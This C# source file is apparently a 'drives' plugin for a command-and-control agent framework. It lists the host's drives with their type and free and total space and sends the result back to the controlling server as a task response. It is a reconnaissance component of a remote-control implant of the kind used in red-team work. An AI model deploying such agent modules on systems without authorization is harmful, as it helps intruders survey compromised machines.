using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Text;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "drives";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            try
            {
                List<dynamic> driveInfo = new List<dynamic>();
                var drives = DriveInfo.GetDrives();
                StringBuilder sb = new StringBuilder();
                foreach(var drive in drives)
                {
                    try
                    {
                        dynamic dyn = new System.Dynamic.ExpandoObject();
                        dyn.DriveName = drive.Name;
                        dyn.DriveType = drive.DriveType;
                        dyn.FreeSpace = drive.TotalFreeSpace / 1000000000;
                        dyn.TotalSpace = drive.TotalSize / 1000000000;
                        driveInfo.Add(dyn);
                    }
                    catch (Exception e)
                    {
                        await messageManager.AddResponse(new ResponseResult()
                        {
                            task_id = job.task.id,
                            user_output = e.ToString(),
                            completed = true
                        });
                    }
                    //dyn.TotalFreeSpace = drive.TotalFreeSpace / 1000000000;
                    //dyn.TotalSize = drive.TotalSize;
                    //dyn.VolumeLabel = drive.VolumeLabel;
                    //dyn.IsReady = drive.IsReady;
                    //dyn.RootDirectory = drive.RootDirectory;
                    //dyn.DriveFormat = drive.DriveFormat;
                    //dyn.AvailableFreeSpace = drive.AvailableFreeSpace;
                }

                string output = JsonSerializer.Serialize(driveInfo);
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = output,
                    completed = true
                });
            }
            catch (Exception e)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true
                });
            }
        }
    }
}
